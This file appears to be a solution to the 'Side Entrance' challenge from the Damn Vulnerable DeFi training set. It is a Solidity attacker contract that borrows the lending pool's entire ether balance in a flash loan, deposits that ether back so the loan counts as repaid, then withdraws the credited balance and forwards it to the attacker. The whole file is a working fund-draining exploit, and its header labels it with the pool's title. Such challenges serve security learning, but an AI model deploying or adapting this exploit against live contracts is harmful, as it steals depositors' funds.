// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool immutable pool;
    address immutable me;

    constructor(address _pool, address _attacker) {
        pool = ISideEntranceLenderPool(_pool);
        me = _attacker;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
    }

    receive() external payable {
        payable(me).send(address(this).balance);
    }
}
